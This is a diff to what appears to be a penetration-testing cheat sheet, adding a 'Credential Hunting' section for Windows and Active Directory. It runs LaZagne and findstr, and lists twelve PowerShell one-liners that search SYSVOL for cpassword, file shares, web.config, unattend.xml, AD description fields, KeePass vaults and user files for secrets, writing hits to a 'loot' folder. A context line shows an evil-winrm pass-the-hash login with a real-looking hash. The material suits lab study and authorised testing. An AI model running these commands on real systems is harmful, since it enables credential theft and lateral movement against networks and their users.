@@ -110,6 +110,75 @@ STATUS_LOGON_FAILURE ( Open )
 
 evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
+====================================================================================================================================================================
+
+( Credential Hunting )
+
+start lazagne.exe all
+python3 lazagne.py all
+
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+
+SYSVOL
+\\domain.local\SYSVOL\domain.local\
+
+1) SYSVOL Shares
+Get-ChildItem "\\domain.local\SYSVOL" -Recurse -File -ErrorAction SilentlyContinue |
+Select-String -Pattern "password|passwd|pwd|creds|credential" |
+Select Path, LineNumber, Line
+
+2) SYSVOL cpassword ( AES encrypted admin password )
+Get-ChildItem "\\domain.local\SYSVOL" -Recurse -File -Include *.xml |
+Select-String "cpassword"
+
+3) IT or Shared checker
+$shares = "\\fileserver\IT","\\fileserver\Shared"
+foreach ($share in $shares) {
+    Get-ChildItem $share -Recurse -File -ErrorAction SilentlyContinue |
+    Select-String -Pattern "password|passwd|pwd|token|apikey|secret" |
+    Select Path, LineNumber, Line
+}
+
+4) Application secrets
+Get-ChildItem "\\fileserver" -Recurse -File -Include web.config -ErrorAction SilentlyContinue |
+Select-String -Pattern "password=|connectionString|user id" |
+Select Path, Line
+
+5) Auto reply files ( Maybe find Admin password )
+Get-ChildItem -Path C:\ -Recurse -File -Include unattend.xml,sysprep.xml -ErrorAction SilentlyContinue |
+Select-String -Pattern "password"
+
+6) AD User Description field
+Get-ADUser -Filter * -Properties Description |
+Where-Object {$_.Description -match "pass|pwd|password"} |
+Select Name, Description
+
+7) AD Computer Description field
+Get-ADComputer -Filter * -Properties Description |
+Where-Object {$_.Description -match "pass|pwd|password"} |
+Select Name, Description
+
+8) Password Vault
+Get-ChildItem C:\ -Recurse -File -Include *.kdbx -ErrorAction SilentlyContinue
+
+9) Users Credential finder
+$keywords = "*.txt","*.docx","*.xlsx","*.csv"
+Get-ChildItem C:\Users -Recurse -File -Include $keywords -ErrorAction SilentlyContinue |
+Where-Object {$_.Name -match "pass|password|credential|login"} |
+Select FullName
+
+10)Get-ChildItem "\\fileserver\Share" -Recurse -File -ErrorAction SilentlyContinue |
+Where-Object {$_.Name -match "pass|password"} |
+Select FullName
+
+11) Shared password files
+$patterns = "password","passwd","pwd","credential","token","apikey","secret"
+
+12) Full system password hunting
+Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue |
+Select-String -Pattern $patterns |
+Select Path, LineNumber, Line |
+Out-File C:\loot\password_hits.txt
 
 
 
